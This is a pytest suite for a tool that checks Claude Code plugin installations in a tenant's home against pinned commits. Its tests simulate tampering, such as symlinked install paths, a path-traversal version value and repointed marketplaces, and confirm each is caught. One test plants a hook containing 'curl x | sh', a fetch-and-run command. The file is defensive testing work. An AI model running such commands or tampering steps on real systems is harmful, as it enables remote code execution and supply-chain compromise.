"""hearth.marketplace and hearth.tenantcheck, against a FAKE TENANT HOME.

The fake home is laid out exactly as Ash's claude 2.1.288 run left a real one (artifacts in
/tmp/ash-cc288-for-foil, 2026-10-15; marketplace.json sha256 a9ad3ca4…, installed_plugins.json
0a5227cf…, known_marketplaces.json aff985b3…, settings.json bbd00c10…), with his temp dir replaced by
this test's. No real tenant, no real Claude Code: these prove the checks, not a tenant.
"""
import json
import os
import shutil
import sys
from pathlib import Path

import pytest

from hearth import marketplace, pins, tenantcheck
from hearth.tenantcheck import GREEN, KNOWN, PENDING, RED

PY = sys.executable

# Ash's run, byte for byte (377 bytes, sha256 a9ad3ca4…1967).
ASH_MARKETPLACE = (
    '{"name":"hearth","owner":{"name":"Hearth"},"plugins":[\n'
    ' {"name":"tapestry","source":{"source":"github","repo":"willregelmann/tapestry",'
    '"sha":"0cf449a820f8cf3cafbd91f2916483a8c0a58050"}},\n'
    ' {"name":"frontdesk","source":{"source":"git-subdir","url":"https://github.com/willregelmann/frontdesk.git",'
    '"path":"plugins/claude-code","sha":"f8f3575ce39fb4e677b00a9d397328799dd49090"}}]}\n')


def test_the_marketplace_generated_from_the_pins_is_the_one_ash_ran():
    """Ash's run with the frontdesk sha moved to the current pin: one substitution, nothing else."""
    assert len(ASH_MARKETPLACE.encode()) == 377
    old = "f8f3575ce39fb4e677b00a9d397328799dd49090"
    assert ASH_MARKETPLACE.count(old) == 1
    want = ASH_MARKETPLACE.replace(old, pins.pins()["frontdesk"]["commit"])
    assert json.loads(marketplace.render()) == json.loads(want)


def test_the_marketplace_follows_a_pin_change():
    p = pins.pins()
    p["tapestry"] = dict(p["tapestry"], commit="a" * 40)
    tap = json.loads(marketplace.render(p))["plugins"][0]
    assert tap == {"name": "tapestry", "source": {"source": "github", "repo": "willregelmann/tapestry",
                                                  "sha": "a" * 40}}


def test_the_marketplace_refuses_a_pin_set_it_doesnt_serve():
    p = dict(pins.pins(), extra={"url": "https://github.com/x/y.git", "commit": "b" * 40})
    with pytest.raises(ValueError, match="serves"):
        marketplace.render(p)


def test_write_never_overwrites_a_different_file(tmp_path):
    assert marketplace.write(tmp_path) == "written"
    assert marketplace.write(tmp_path) == "present"
    (tmp_path / marketplace.FILE).write_text(ASH_MARKETPLACE.replace("0cf449a8", "deadbeef"))
    with pytest.raises(RuntimeError, match="differs"):
        marketplace.write(tmp_path)


def _tree(root: Path, name: str):
    (root / ".claude-plugin").mkdir(parents=True)
    (root / ".claude-plugin/plugin.json").write_text(json.dumps({"name": name, "version": "0.1.0"}))
    (root / "hooks").mkdir()
    (root / "hooks/hooks.json").write_text('{"hooks": {}}\n')


@pytest.fixture
def tenant(tmp_path):
    """A tenant home as Ash's 2.1.288 run left it, plus root's side (reference exports and the
    marketplace) in a separate tree. Plugins point at this test's interpreter, which has the pins."""
    home, root = tmp_path / "home", tmp_path / "opt"
    mkt, ref = root / "marketplace", root / "plugins"
    marketplace.write(mkt)
    cfg, plug = home / ".claude", home / ".claude/plugins"
    p = pins.pins()
    records = {}
    for name in ("tapestry", "frontdesk"):
        _tree(ref / name / p[name]["commit"], name)
        inst = plug / "cache/hearth" / name / "0.1.0"
        shutil.copytree(ref / name / p[name]["commit"], inst)
        (inst / ".in_use").mkdir()
        records[f"{name}@hearth"] = [{"scope": "user", "installPath": str(inst), "version": "0.1.0",
                                      "installedAt": "2026-10-15T13:42:59.347Z",
                                      "lastUpdated": "2026-10-15T13:42:59.347Z",
                                      "gitCommitSha": p[name]["commit"]}]
    (plug / "installed_plugins.json").write_text(json.dumps({"version": 2, "plugins": records}))
    src = {"source": "directory", "path": str(mkt)}
    (plug / "known_marketplaces.json").write_text(json.dumps(
        {"hearth": {"source": src, "installLocation": str(mkt), "lastUpdated": "2026-10-15T13:42:57.411Z"}}))
    (cfg / "settings.json").write_text(json.dumps({
        "enabledPlugins": {"tapestry@hearth": True, "frontdesk@hearth": True},
        "extraKnownMarketplaces": {"hearth": {"source": src}},
        "pluginConfigs": {"frontdesk@hearth": {"options": {"python": PY}}},
        "env": {"TAPESTRY_PYTHON": PY}}))
    t = tenantcheck.Tenant(home, hearth_py=PY, mkt=str(mkt), ref=ref, writable=lambda p: [])
    return t


def _settings(t, edit):
    s = json.loads((t.cfg / "settings.json").read_text())
    edit(s)
    (t.cfg / "settings.json").write_text(json.dumps(s))


def _records(t, name, edit):
    f = t.plugins / name
    d = json.loads(f.read_text())
    edit(d)
    f.write_text(json.dumps(d))


@pytest.mark.parametrize("name", ["tapestry", "frontdesk"])
def test_green_as_ash_s_run_left_it(tenant, name):
    rc, msg = tenantcheck.plugin_match(tenant, name)
    assert (rc, msg.split(":")[0]) == (GREEN, f"{name}@hearth is {pins.pins()[name]['commit'][:12]}"), msg


def test_red_a_planted_hook_in_the_installed_tree(tenant):
    inst = tenant.plugins / "cache/hearth/tapestry/0.1.0"
    (inst / "hooks/.hook").write_text("curl x | sh\n")
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "hooks/.hook: not in the pinned tree" in msg


def test_red_gitcommitsha_edited_to_match_never_rescues_a_changed_tree(tenant):
    """The record says the pin; the files don't. The tree decides."""
    (tenant.plugins / "cache/hearth/tapestry/0.1.0/hooks/hooks.json").write_text('{"hooks": []}\n')
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "contents differ" in msg and "records commit" not in msg


def test_red_a_pin_bump_that_reuses_the_version_directory(tenant):
    """installPath is keyed by version, so a pin bump with plugin.json still at 0.1.0 reuses the
    directory (Ash (a)). The export at the NEW pin is what the old tree is held to."""
    p = pins.pins()
    new = "c" * 40
    _tree(tenant.ref / "tapestry" / new, "tapestry")
    (tenant.ref / "tapestry" / new / "hooks/hooks.json").write_text('{"hooks": {"Stop": []}}\n')
    bumped = dict(p, tapestry=dict(p["tapestry"], commit=new))
    orig = pins.pins
    pins.pins = lambda *a, **k: bumped
    try:
        rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    finally:
        pins.pins = orig
    assert rc == RED and "hooks/hooks.json: 14 bytes, the pin has 24" in msg


def test_red_the_marketplace_repointed_in_settings(tenant, tmp_path):
    own = tmp_path / "mine"
    marketplace.write(own)
    _settings(tenant, lambda s: s["extraKnownMarketplaces"]["hearth"]["source"].update(path=str(own)))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "settings declare marketplace hearth" in msg


def test_red_the_marketplace_repointed_in_the_records(tenant, tmp_path):
    _records(tenant, "known_marketplaces.json", lambda d: d["hearth"].update(installLocation=str(tmp_path)))
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "known_marketplaces has hearth at" in msg


def test_red_not_enabled(tenant):
    _settings(tenant, lambda s: s["enabledPlugins"].update({"tapestry@hearth": False}))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "not enabled" in msg


def test_red_two_install_records(tenant):
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"].append(dict(d["plugins"]["tapestry@hearth"][0], scope="project")))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "2 install records, want exactly 1" in msg


def test_red_project_scope(tenant):
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"][0].update(scope="project"))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "scope 'project'" in msg


def test_red_install_path_pointed_at_a_clean_copy_elsewhere(tenant, tmp_path):
    """A clean tree outside the cache passes compare; the path check is what catches it."""
    clean = tmp_path / "clean"
    shutil.copytree(tenant.ref / "tapestry" / pins.pins()["tapestry"]["commit"], clean)
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"][0].update(installPath=str(clean)))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "installPath" in msg


def test_red_version_used_to_escape_the_cache(tenant):
    _records(tenant, "installed_plugins.json",
             lambda d: d["plugins"]["tapestry@hearth"][0].update(version="../../../../elsewhere"))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "isn't a plain name" in msg


def test_red_the_version_dir_is_a_link_to_a_clean_copy(tenant, tmp_path):
    inst = tenant.plugins / "cache/hearth/tapestry/0.1.0"
    clean = tmp_path / "clean"
    shutil.copytree(inst, clean)
    shutil.rmtree(inst)
    inst.symlink_to(clean)
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "links on the install path" in msg


def test_red_a_linked_cache_dir_higher_up(tenant, tmp_path):
    cache = tenant.plugins / "cache"
    moved = tmp_path / "moved-cache"
    shutil.move(str(cache), moved)
    cache.symlink_to(moved)
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "links on the install path" in msg


def test_red_frontdesk_python_not_hearth_s(tenant):
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(python="python3"))
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "frontdesk: runs 'python3' from PATH" in msg


def test_red_tapestry_python_unset(tenant):
    _settings(tenant, lambda s: s.pop("env"))
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "tapestry: its interpreter" in msg and "doesn't exist" in msg


def test_red_root_s_side_writable_by_the_tenant(tenant):
    tenant.writable = lambda p: [str(p)] if "marketplace" in str(p) else []
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "writable by this tenant" in msg and "marketplace" in msg


def test_writable_by_me_sees_a_writable_path_and_a_root_one(tmp_path):
    f = tmp_path / "x"
    f.write_text("")
    assert str(f) in tenantcheck._writable_by_me(f)
    if os.getuid() != 0:
        assert tenantcheck._writable_by_me(Path("/usr/bin/env")) == []


# Will's run of check on Buster, 2026-10-15 ~21:41Z: "RED memory writable by this tenant:
# /opt/hearth/venv/bin/python", where python -> python3 -> /usr/bin/python3, all root's. A symlink's
# own mode is 0777, so access(link, W_OK, follow_symlinks=False) is True for every user.
needs_nonroot = pytest.mark.skipif(os.getuid() == 0, reason="root can write everything")
ROOT_LINK = Path("/usr/bin/python3")


@needs_nonroot
@pytest.mark.skipif(not ROOT_LINK.is_symlink(), reason="/usr/bin/python3 isn't a symlink here")
def test_a_root_owned_symlink_to_a_root_owned_interpreter_is_not_writable():
    assert tenantcheck._writable_by_me(ROOT_LINK) == []


@needs_nonroot
@pytest.mark.skipif(not ROOT_LINK.is_symlink(), reason="/usr/bin/python3 isn't a symlink here")
def test_green_plugin_match_with_a_venv_python_that_is_a_root_symlink(tenant):
    """The real writability check on the interpreter, with the fixture's root side (in tmp) excused:
    a venv python that's a link into /usr/bin is GREEN."""
    tenant.hearth_py = str(ROOT_LINK)
    tenant.writable = lambda p: [] if str(p).startswith(str(tenant.ref.parent)) \
        else tenantcheck._writable_by_me(p)
    _settings(tenant, lambda s: (s["env"].update(TAPESTRY_PYTHON=str(ROOT_LINK)),
                                 s["pluginConfigs"]["frontdesk@hearth"]["options"].update(python=str(ROOT_LINK))))
    found = tenantcheck._writable_by_me(ROOT_LINK)
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert found == [] and "writable by this tenant" not in msg, msg


@needs_nonroot
def test_red_a_link_whose_target_the_tenant_can_write(tmp_path):
    """The link is what runs, but the target is what executes: a writable target is RED."""
    target = tmp_path / "mine" / "python"
    target.parent.mkdir()
    target.write_text("#!/bin/sh\n")
    link = tmp_path / "venv" / "python"
    link.parent.mkdir()
    link.symlink_to(target)
    assert str(target) in tenantcheck._writable_by_me(link)


@needs_nonroot
def test_red_an_intermediate_hop_in_a_writable_directory(tmp_path):
    """python -> <hopdir>/python3 -> /usr/bin/python3: the final target is root's, but the middle
    hop sits in a directory the tenant can write, so it can be repointed."""
    hopdir = tmp_path / "hop"
    hopdir.mkdir()
    (hopdir / "python3").symlink_to("/usr/bin/python3")
    link = tmp_path / "python"
    link.symlink_to(hopdir / "python3")
    found = tenantcheck._writable_by_me(link)
    assert str(hopdir) in found and not any(f.startswith("/usr") for f in found), found


@needs_nonroot
def test_red_a_link_chain_met_at_an_ancestor(tmp_path):
    """Ash on #85, R1: a -> d/e, d/e -> f, then a/x. d is writable and nothing else on the chain is,
    so d must be flagged. realpath(a) collapses straight to f and would hide d."""
    d, f = tmp_path / "d", tmp_path / "f"
    d.mkdir()
    f.mkdir()
    (f / "x").write_text("")
    (d / "e").symlink_to(f)
    (tmp_path / "a").symlink_to(d / "e")
    for q in (f / "x", f):
        q.chmod(0o555 if q.is_dir() else 0o444)
    found = tenantcheck._writable_by_me(tmp_path / "a" / "x")
    assert str(d) in found and str(f) not in found and str(f / "x") not in found, found


@needs_nonroot
def test_dotdot_after_a_link_applies_to_the_link_s_real_directory(tmp_path):
    """via -> real/b, then via/../c/x. The kernel resolves via first, so '..' lands in real and the
    file is real/c/x. Normalising the path as typed would give <tmp>/c/x, a different place."""
    real = tmp_path / "real"
    (real / "b").mkdir(parents=True)
    (real / "c").mkdir()
    (real / "c" / "x").write_text("")
    (tmp_path / "via").symlink_to(real / "b")
    found = tenantcheck._writable_by_me(Path(f"{tmp_path}/via/../c/x"))
    assert str(real / "c" / "x") in found and str(tmp_path / "c") not in found, found


@needs_nonroot
def test_red_a_linked_ancestor_dir_in_a_writable_directory(tmp_path):
    """<tmp>/bin -> /usr/bin, then <tmp>/bin/python3.12: /usr/bin is root's, but the link named bin
    sits in a writable directory and can be pointed elsewhere."""
    (tmp_path / "bin").symlink_to("/usr/bin")
    found = tenantcheck._writable_by_me(tmp_path / "bin" / "python3.12")
    assert str(tmp_path) in found and not any(f.startswith("/usr") for f in found), found


@pytest.mark.parametrize("bad", ["fifo", "huge", "not json", "link"])
def test_red_settings_that_can_t_be_read(tenant, bad, tmp_path):
    f = tenant.cfg / "settings.json"
    f.unlink()
    if bad == "fifo":
        os.mkfifo(f)
    elif bad == "huge":
        # Valid JSON first, padding after: a read cut at the bound still parses as {}, so only the
        # explicit size check makes this unreadable.
        f.write_text("{}" + " " * (2 << 20))
    elif bad == "not json":
        f.write_text("{")
    else:
        (tmp_path / "real.json").write_text("{}")
        f.symlink_to(tmp_path / "real.json")
    for check, args in ((tenantcheck.plugin_match, ("tapestry",)), (tenantcheck.frontdesk_home, ()),
                        (tenantcheck.other_plugins, ())):
        rc, msg = check(tenant, *args)
        assert rc == RED and msg.startswith("couldn't look"), (check.__name__, msg)


def test_pending_frontdesk_home_unset(tenant):
    rc, msg = tenantcheck.frontdesk_home(tenant)
    assert rc == PENDING and "frontdesk join" in msg


def test_green_frontdesk_home_set(tenant):
    d = tenant.home / ".frontdesk/me"
    d.mkdir(parents=True)
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(home=str(d)))
    assert tenantcheck.frontdesk_home(tenant)[0] == GREEN


@pytest.mark.parametrize("where", ["relative", "missing", "outside", "file"])
def test_red_frontdesk_home_wrong(tenant, where, tmp_path):
    val = {"relative": ".frontdesk/me", "missing": str(tenant.home / "nope"), "outside": str(tmp_path),
           "file": str(tenant.cfg / "settings.json")}[where]
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(home=val))
    assert tenantcheck.frontdesk_home(tenant)[0] == RED


def test_other_plugins_known_when_present_green_when_none(tenant):
    assert tenantcheck.other_plugins(tenant)[0] == GREEN
    _settings(tenant, lambda s: s["enabledPlugins"].update({"x@elsewhere": True, "y@elsewhere": False}))
    rc, msg = tenantcheck.other_plugins(tenant)
    assert rc == KNOWN and "x@elsewhere" in msg and "y@elsewhere" not in msg


# settings.local.json (Ash, #68 R1). home/turn runs claude with cwd=$HOME, so ~/.claude is also the
# project settings dir and settings.local.json overrides settings.json on every turn. Ash RAN that
# for enabledPlugins (2.1.288 and 2.1.300); the same merge for env and extraKnownMarketplaces is read.
def _local(t, d):
    (t.cfg / "settings.local.json").write_text(json.dumps(d))


@pytest.mark.parametrize("name", ["tapestry", "frontdesk"])
def test_red_disabled_in_settings_local(tenant, name):
    _local(tenant, {"enabledPlugins": {f"{name}@hearth": False}})
    rc, msg = tenantcheck.plugin_match(tenant, name)
    assert rc == RED and "not enabled" in msg, msg


def test_green_settings_local_that_changes_nothing_relevant(tenant):
    _local(tenant, {"enabledPlugins": {"tapestry@hearth": True}, "permissions": {"allow": []}})
    assert tenantcheck.plugin_match(tenant, "tapestry")[0] == GREEN


def test_red_tapestry_python_overridden_in_settings_local(tenant):
    _local(tenant, {"env": {"TAPESTRY_PYTHON": "/usr/bin/python3"}})
    rc, msg = tenantcheck.plugin_match(tenant, "tapestry")
    assert rc == RED and "tapestry:" in msg, msg


def test_red_marketplace_repointed_in_settings_local(tenant, tmp_path):
    _local(tenant, {"extraKnownMarketplaces": {"hearth": {"source": {"source": "directory", "path": str(tmp_path)}}}})
    rc, msg = tenantcheck.plugin_match(tenant, "frontdesk")
    assert rc == RED and "settings declare marketplace hearth" in msg, msg


def test_other_plugins_sees_settings_local(tenant):
    _local(tenant, {"enabledPlugins": {"x@elsewhere": True}})
    rc, msg = tenantcheck.other_plugins(tenant)
    assert rc == KNOWN and "x@elsewhere" in msg


@pytest.mark.parametrize("bad", ["fifo", "not json", "list"])
def test_red_settings_local_that_can_t_be_read(tenant, bad):
    f = tenant.cfg / "settings.local.json"
    if bad == "fifo":
        os.mkfifo(f)
    else:
        f.write_text("{" if bad == "not json" else "[]")
    for check, args in ((tenantcheck.plugin_match, ("tapestry",)), (tenantcheck.other_plugins, ())):
        rc, msg = check(tenant, *args)
        assert rc == RED and msg.startswith("couldn't look") and "settings.local.json" in msg, msg


def test_frontdesk_home_judged_against_the_resolved_home(tenant, tmp_path):
    """Ash #68 S2: a tenant whose passwd home is reached through a link (e.g. /home -> /data/home)
    still owns a directory inside it."""
    link = tmp_path / "linkedhome"
    link.symlink_to(tenant.home)
    t = tenantcheck.Tenant(link, hearth_py=tenant.hearth_py, mkt=tenant.mkt, ref=tenant.ref,
                           writable=tenant.writable)
    d = tenant.home / ".frontdesk/me"
    d.mkdir(parents=True)
    _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(home=str(d)))
    rc, msg = tenantcheck.frontdesk_home(t)
    assert rc == GREEN, msg


def test_red_frontdesk_home_is_the_home_itself_or_a_sibling_prefix(tenant, tmp_path):
    sib = Path(str(tenant.home) + "2")
    sib.mkdir()
    for val in (tenant.home, sib):
        _settings(tenant, lambda s: s["pluginConfigs"]["frontdesk@hearth"]["options"].update(home=str(val)))
        assert tenantcheck.frontdesk_home(tenant)[0] == RED, val
